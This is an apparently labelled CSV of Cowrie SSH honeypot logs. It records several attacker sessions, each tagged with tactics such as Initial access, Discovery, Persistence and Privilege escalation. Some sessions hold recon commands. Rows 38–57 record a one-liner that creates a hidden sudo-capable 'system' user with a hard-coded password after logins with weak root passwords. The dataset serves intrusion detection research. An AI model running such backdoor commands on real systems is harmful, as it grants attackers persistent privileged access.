,event,session_id,session,labels
33,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/Ac123456] succeeded"", ""password"": ""Ac123456"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T00:22:49.049806Z"", ""username"": ""root"", ""session_id"": ""d71014776411""}",d71014776411,grep -c ^processor /proc/cpuinfo;,"['Initial access', 'Discovery']"
34,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T00:22:49.471961Z"", ""session_id"": ""d71014776411""}",d71014776411,grep -c ^processor /proc/cpuinfo;,"['Initial access', 'Discovery']"
35,"{""eventid"": ""cowrie.command.input"", ""input"": ""grep -c ^processor /proc/cpuinfo"", ""message"": ""CMD: grep -c ^processor /proc/cpuinfo"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T00:22:49.472321Z"", ""session_id"": ""d71014776411""}",d71014776411,grep -c ^processor /proc/cpuinfo;,"['Initial access', 'Discovery']"
36,"{""duplicate"": false, ""duration"": ""0.2"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/ce810d21e5e52f012e4de4899ad9e596879130a62b19dfef18cf1d3cf527edf5 after 0.2 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""ce810d21e5e52f012e4de4899ad9e596879130a62b19dfef18cf1d3cf527edf5"", ""size"": 28.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T00:22:49.672300Z"", ""ttylog"": ""var/lib/cowrie/tty/ce810d21e5e52f012e4de4899ad9e596879130a62b19dfef18cf1d3cf527edf5"", ""session_id"": ""d71014776411""}",d71014776411,grep -c ^processor /proc/cpuinfo;,"['Initial access', 'Discovery']"
37,"{""duration"": ""2.1"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 2.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T00:22:49.672779Z"", ""session_id"": ""d71014776411""}",d71014776411,grep -c ^processor /proc/cpuinfo;,"['Initial access', 'Discovery']"
38,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:37060 (10.42.4.33:2222) [session: 9915b874c4bc]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 37060.0, ""timestamp"": ""2025-08-08T10:58:39.735962Z"", ""session_id"": ""9915b874c4bc""}",9915b874c4bc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system  && sudo usermod -aG sudo system ; openssl passwd -1 2dzzBdBw;,"['Initial access', 'Persistence', 'Privilege escalation']"
39,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T10:58:39.736496Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""9915b874c4bc""}",9915b874c4bc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system  && sudo usermod -aG sudo system ; openssl passwd -1 2dzzBdBw;,"['Initial access', 'Persistence', 'Privilege escalation']"
40,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T10:58:39.840309Z"", ""session_id"": ""9915b874c4bc""}",9915b874c4bc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system  && sudo usermod -aG sudo system ; openssl passwd -1 2dzzBdBw;,"['Initial access', 'Persistence', 'Privilege escalation']"
41,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T10:58:40.153162Z"", ""username"": ""root"", ""session_id"": ""9915b874c4bc""}",9915b874c4bc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system  && sudo usermod -aG sudo system ; openssl passwd -1 2dzzBdBw;,"['Initial access', 'Persistence', 'Privilege escalation']"
42,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T10:58:40.378289Z"", ""session_id"": ""9915b874c4bc""}",9915b874c4bc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system  && sudo usermod -aG sudo system ; openssl passwd -1 2dzzBdBw;,"['Initial access', 'Persistence', 'Privilege escalation']"
43,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T10:58:40.378670Z"", ""session_id"": ""9915b874c4bc""}",9915b874c4bc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system  && sudo usermod -aG sudo system ; openssl passwd -1 2dzzBdBw;,"['Initial access', 'Persistence', 'Privilege escalation']"
44,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 2dzzBdBw"", ""message"": ""CMD: openssl passwd -1 2dzzBdBw"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T10:58:40.379101Z"", ""session_id"": ""9915b874c4bc""}",9915b874c4bc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system  && sudo usermod -aG sudo system ; openssl passwd -1 2dzzBdBw;,"['Initial access', 'Persistence', 'Privilege escalation']"
45,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 2dzzBdBw"", ""message"": ""Command not found: openssl passwd -1 2dzzBdBw"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T10:58:40.379728Z"", ""session_id"": ""9915b874c4bc""}",9915b874c4bc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system  && sudo usermod -aG sudo system ; openssl passwd -1 2dzzBdBw;,"['Initial access', 'Persistence', 'Privilege escalation']"
46,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/dcef11122ae3da29ec3ae5ad4f55d5c66d1c76a5e6543ae40af78a095696b753 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""dcef11122ae3da29ec3ae5ad4f55d5c66d1c76a5e6543ae40af78a095696b753"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T10:58:40.484891Z"", ""ttylog"": ""var/lib/cowrie/tty/dcef11122ae3da29ec3ae5ad4f55d5c66d1c76a5e6543ae40af78a095696b753"", ""session_id"": ""9915b874c4bc""}",9915b874c4bc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system  && sudo usermod -aG sudo system ; openssl passwd -1 2dzzBdBw;,"['Initial access', 'Persistence', 'Privilege escalation']"
47,"{""duration"": ""0.7"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.7 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T10:58:40.485433Z"", ""session_id"": ""9915b874c4bc""}",9915b874c4bc,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 2dzzBdBw) system  && sudo usermod -aG sudo system ; openssl passwd -1 2dzzBdBw;,"['Initial access', 'Persistence', 'Privilege escalation']"
48,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:52998 (10.42.4.33:2222) [session: d8eb3d0e9192]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 52998.0, ""timestamp"": ""2025-08-10T22:29:21.329545Z"", ""session_id"": ""d8eb3d0e9192""}",d8eb3d0e9192,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system  && sudo usermod -aG sudo system ; openssl passwd -1 GQNxXcS3;,"['Initial access', 'Persistence', 'Privilege escalation']"
49,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:29:21.402977Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""d8eb3d0e9192""}",d8eb3d0e9192,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system  && sudo usermod -aG sudo system ; openssl passwd -1 GQNxXcS3;,"['Initial access', 'Persistence', 'Privilege escalation']"
50,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:29:21.609749Z"", ""session_id"": ""d8eb3d0e9192""}",d8eb3d0e9192,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system  && sudo usermod -aG sudo system ; openssl passwd -1 GQNxXcS3;,"['Initial access', 'Persistence', 'Privilege escalation']"
51,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:29:21.926295Z"", ""username"": ""root"", ""session_id"": ""d8eb3d0e9192""}",d8eb3d0e9192,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system  && sudo usermod -aG sudo system ; openssl passwd -1 GQNxXcS3;,"['Initial access', 'Persistence', 'Privilege escalation']"
52,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:29:22.160763Z"", ""session_id"": ""d8eb3d0e9192""}",d8eb3d0e9192,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system  && sudo usermod -aG sudo system ; openssl passwd -1 GQNxXcS3;,"['Initial access', 'Persistence', 'Privilege escalation']"
53,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:29:22.161278Z"", ""session_id"": ""d8eb3d0e9192""}",d8eb3d0e9192,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system  && sudo usermod -aG sudo system ; openssl passwd -1 GQNxXcS3;,"['Initial access', 'Persistence', 'Privilege escalation']"
54,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 GQNxXcS3"", ""message"": ""CMD: openssl passwd -1 GQNxXcS3"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:29:22.185239Z"", ""session_id"": ""d8eb3d0e9192""}",d8eb3d0e9192,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system  && sudo usermod -aG sudo system ; openssl passwd -1 GQNxXcS3;,"['Initial access', 'Persistence', 'Privilege escalation']"
55,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 GQNxXcS3"", ""message"": ""Command not found: openssl passwd -1 GQNxXcS3"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:29:22.185864Z"", ""session_id"": ""d8eb3d0e9192""}",d8eb3d0e9192,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system  && sudo usermod -aG sudo system ; openssl passwd -1 GQNxXcS3;,"['Initial access', 'Persistence', 'Privilege escalation']"
56,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/7d1a34949e39e62413856fa1a98b40515571c75cd211501c540f95ef43dc8300 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""7d1a34949e39e62413856fa1a98b40515571c75cd211501c540f95ef43dc8300"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:29:22.278368Z"", ""ttylog"": ""var/lib/cowrie/tty/7d1a34949e39e62413856fa1a98b40515571c75cd211501c540f95ef43dc8300"", ""session_id"": ""d8eb3d0e9192""}",d8eb3d0e9192,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system  && sudo usermod -aG sudo system ; openssl passwd -1 GQNxXcS3;,"['Initial access', 'Persistence', 'Privilege escalation']"
57,"{""duration"": ""0.9"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.9 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-10T22:29:22.279573Z"", ""session_id"": ""d8eb3d0e9192""}",d8eb3d0e9192,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 GQNxXcS3) system  && sudo usermod -aG sudo system ; openssl passwd -1 GQNxXcS3;,"['Initial access', 'Persistence', 'Privilege escalation']"
58,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:24621 (10.42.6.15:2222) [session: 8a01eda84d97]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 24621.0, ""timestamp"": ""2025-08-14T00:37:34.564005Z"", ""session_id"": ""8a01eda84d97""}",8a01eda84d97,"grep ^NAME= /etc/os-release  | cut -d '=' -f2  | tr -d '""'  | head -n1;","['Initial access', 'Discovery']"
59,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T00:37:34.634583Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""8a01eda84d97""}",8a01eda84d97,"grep ^NAME= /etc/os-release  | cut -d '=' -f2  | tr -d '""'  | head -n1;","['Initial access', 'Discovery']"
60,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""aes256-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""0a07365cc01fa9fc82608ba4019af499"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c"", ""kex-strict-c-v00@openssh.com""], ""keyAlgs"": [""rsa-sha2-256-cert-v01@openssh.com"", ""rsa-sha2-512-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-256"", ""rsa-sha2-512"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-512-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha2-512"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T00:37:34.888051Z"", ""session_id"": ""8a01eda84d97""}",8a01eda84d97,"grep ^NAME= /etc/os-release  | cut -d '=' -f2  | tr -d '""'  | head -n1;","['Initial access', 'Discovery']"
61,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/123456789] succeeded"", ""password"": ""123456789"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T00:37:35.895901Z"", ""username"": ""root"", ""session_id"": ""8a01eda84d97""}",8a01eda84d97,"grep ^NAME= /etc/os-release  | cut -d '=' -f2  | tr -d '""'  | head -n1;","['Initial access', 'Discovery']"
62,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T00:37:36.998918Z"", ""session_id"": ""8a01eda84d97""}",8a01eda84d97,"grep ^NAME= /etc/os-release  | cut -d '=' -f2  | tr -d '""'  | head -n1;","['Initial access', 'Discovery']"
63,"{""eventid"": ""cowrie.command.input"", ""input"": ""grep ^NAME= /etc/os-release | cut -d '=' -f2 | tr -d '\""' | head -n1"", ""message"": ""CMD: grep ^NAME= /etc/os-release | cut -d '=' -f2 | tr -d '\""' | head -n1"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T00:37:36.999578Z"", ""session_id"": ""8a01eda84d97""}",8a01eda84d97,"grep ^NAME= /etc/os-release  | cut -d '=' -f2  | tr -d '""'  | head -n1;","['Initial access', 'Discovery']"
